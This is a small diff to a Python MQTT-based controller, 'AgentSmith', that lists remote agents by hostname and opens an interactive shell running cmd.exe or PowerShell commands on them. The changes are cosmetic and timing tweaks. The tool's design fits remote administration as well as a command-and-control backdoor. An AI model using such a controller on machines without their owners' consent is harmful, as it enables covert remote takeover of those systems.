@@ -24,7 +24,7 @@ TIMEOUT = 10
 
 class AgentSmithController:
     def __init__(self):
-        self.client = mqtt.Client(client_id=f"controller-{int(time.time())}")
+        self.client = mqtt.Client(client_id=f"ctrl-{int(time.time())}")
         self.client.on_connect = self._on_connect
         self.client.on_message = self._on_message
         self.agents = {}
@@ -32,21 +32,18 @@ class AgentSmithController:
         self.resp_event = threading.Event()
 
     def _on_connect(self, client, userdata, flags, rc):
-        print(f"[Connected to {BROKER}:{PORT}]" if rc == 0 else f"[Connection failed: {rc}]")
         if rc == 0:
             client.subscribe("agent/+/status", qos=0)
-            print("[Listening for agent heartbeats...]")
 
     def _on_message(self, client, userdata, msg):
-        topic = msg.topic
         try:
             payload = json.loads(msg.payload)
         except json.JSONDecodeError:
             return
 
+        topic = msg.topic
         if topic.endswith("/status") and "hostname" in payload:
             self.agents[payload["hostname"]] = payload
-
         if topic.endswith("/resp"):
             self.pending_resp = payload
             self.resp_event.set()
@@ -62,8 +59,7 @@ class AgentSmithController:
     def list_agents(self):
         print(f"\n{'Hostname':<20} {'Uptime':<10} {'Version':<10} {'Last Seen'}")
         print("-" * 60)
-        self.client.publish("agent/+/status", "").wait_for_publish()
-        time.sleep(2)
+        time.sleep(4)
         if not self.agents:
             print("  No active agents found.")
         for hostname, info in sorted(self.agents.items()):
@@ -76,6 +72,7 @@ class AgentSmithController:
         topic = f"agent/{hostname}/cmd"
         resp_topic = f"agent/{hostname}/resp"
         self.client.subscribe(resp_topic)
+        time.sleep(0.3)
 
         payload = {"cmd": cmd_type}
         if command:
@@ -106,7 +103,7 @@ class AgentSmithController:
             print(f"  Timeout: no response from {hostname}")
 
     def interactive_shell(self, hostname):
-        print(f"  AgentSmith interactive shell — {hostname}")
+        print(f"  AgentSmith interactive shell -- {hostname}")
         print(f"  Commands starting with 'ps:' run PowerShell, otherwise cmd.exe.")
         print(f"  Type 'exit' or Ctrl+C to quit.\n")
         try:
@@ -134,6 +131,7 @@ def main():
 
     ctrl = AgentSmithController()
     ctrl.start()
+    time.sleep(0.5)
 
     try:
         cmd = sys.argv[1]
